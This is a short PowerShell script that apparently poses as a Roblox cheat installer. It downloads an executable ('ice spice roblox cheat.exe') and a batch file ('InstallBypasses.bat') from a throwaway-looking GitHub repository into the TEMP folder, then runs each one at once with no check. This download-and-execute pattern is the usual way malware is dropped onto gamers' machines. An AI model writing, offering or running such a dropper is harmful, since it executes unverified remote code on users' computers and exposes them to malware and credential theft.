$downloadUrl1 = "https://github.com/bruh3894513/fantastic-disco/raw/main/ice%20spice%20roblox%20cheat.exe"
$tempFilePath1 = "$env:TEMP\ice_spice_roblox_cheat.exe"
Invoke-WebRequest -Uri $downloadUrl1 -OutFile $tempFilePath1
Start-Process -FilePath $tempFilePath1

# Wait for the first file to finish running
Start-Sleep -Seconds 5

# Download and run the second file
$downloadUrl2 = "https://github.com/bruh3894513/fantastic-disco/raw/main/InstallBypasses.bat"
$tempFilePath2 = "$env:TEMP\InstallBypasses.bat"
Invoke-WebRequest -Uri $downloadUrl2 -OutFile $tempFilePath2
Start-Process -FilePath $tempFilePath2
